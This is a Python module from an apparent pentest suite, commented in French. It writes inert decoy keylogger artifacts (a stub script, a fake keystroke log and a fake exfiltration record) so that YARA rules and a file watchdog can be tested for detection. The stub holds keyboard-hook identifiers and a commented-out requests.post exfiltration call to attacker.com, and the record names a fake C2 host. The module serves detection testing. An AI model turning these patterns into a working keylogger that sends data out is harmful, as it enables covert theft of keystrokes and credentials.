#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
⌨️ sim_keylogger — Simulation patterns keylogger
GPLv3 — Victor Pozen — Kerberos Pentest Suite v1.0
"""
import time, json
from pathlib import Path
from datetime import datetime

MODULE_NAME  = "sim_keylogger"
MODULE_LABEL = "Keylogger"
_running     = False
_OUT_DIR     = Path(__file__).parent.parent / "payloads_fake" / "keylogger"


def run(target: str = "127.0.0.1", callback=None) -> dict:
    global _running
    _running = True
    _OUT_DIR.mkdir(parents=True, exist_ok=True)

    results = {"module": MODULE_NAME, "target": target,
               "started": datetime.now().isoformat(),
               "events": [], "files": [], "status": "running"}

    def log(msg):
        results["events"].append(msg)
        if callback: callback(msg)

    log("⌨️ Démarrage simulation Keylogger...")

    # ── Fichier 1 : script keylogger signé (YARA AI_Generated_Keylogger_Script) ──
    time.sleep(0.2)
    f1 = _OUT_DIR / "fake_keylogger.py"
    f1.write_text('''#!/usr/bin/env python3
# KERBEROS PENTEST TEST — Signature keylogger IA (inoffensif)
# Ce script contient les patterns YARA sans capturer aucune frappe

# YARA $hook3 : "keyboard.on_press"
# YARA $hook4 : "pynput.keyboard"
# pynput.keyboard — import commenté, pas exécuté

# YARA $log1 : "keylog"
KEYLOG_FILE = "/tmp/keylog_test.txt"  # fichier jamais créé

# YARA $send2 : "requests.post"
def fake_send(data):
    # requests.post("http://attacker.com", data=data)  # commenté
    print(f"[FAKE KEYLOGGER] Envoi simulé : {len(data)} octets")

# YARA $ai_pat3 : "# Note: This is for educational"
# Note: This is for educational purposes only — test Kerberos

def fake_on_press(key):
    # keyboard.on_press(fake_on_press)  # jamais exécuté
    print(f"[FAKE] touche capturée : {key}")

if __name__ == "__NEVER__":
    fake_send("test_data")
''', encoding="utf-8")
    results["files"].append(str(f1))
    log(f"✅ Créé : {f1.name}")
    log("   → YARA doit détecter : AI_Generated_Keylogger_Script")

    # ── Fichier 2 : log de frappes fake ──────────────────────────────────
    time.sleep(0.2)
    f2 = _OUT_DIR / "fake_keystrokes.log"
    fake_keys = [
        "[2026-03-02 22:00:01] Key.shift + p → P",
        "[2026-03-02 22:00:01] Key.shift + a → A",
        "[2026-03-02 22:00:02] Key.shift + s → S",
        "[2026-03-02 22:00:02] Key.shift + s → S",
        "[KERBEROS_PENTEST_TEST] Ce fichier est un test inoffensif",
        "[KERBEROS_PENTEST_TEST] Aucune vraie frappe capturée",
    ]
    f2.write_text("\n".join(fake_keys), encoding="utf-8")
    results["files"].append(str(f2))
    log(f"✅ Créé : {f2.name} (faux log de frappes)")
    log("   → Watchdog fichiers doit détecter : création log suspect")

    # ── Fichier 3 : exfiltration fake ────────────────────────────────────
    time.sleep(0.2)
    f3 = _OUT_DIR / "fake_exfil_data.json"
    exfil = {
        "note":        "KERBEROS_PENTEST_TEST — données inoffensives",
        "captured":    ["test_key_1", "test_key_2"],
        "target_host": "fake-c2.example.com",
        "timestamp":   datetime.now().isoformat(),
    }
    f3.write_text(json.dumps(exfil, indent=2), encoding="utf-8")
    results["files"].append(str(f3))
    log(f"✅ Créé : {f3.name} (fausse exfiltration)")

    log(f"📊 {len(results['files'])} fichier(s) keylogger créés")
    log("⏳ En attente détection par guard_yara.py + watchdog fichiers...")

    results["status"] = "completed"
    results["finished"] = datetime.now().isoformat()
    _running = False
    return results


def stop():
    global _running
    _running = False


def get_info() -> dict:
    return {"name": MODULE_NAME, "label": MODULE_LABEL,
            "description": "Génère patterns keylogger — rien capturé",
            "version": "1.0", "targets": ["guard_yara.py"]}
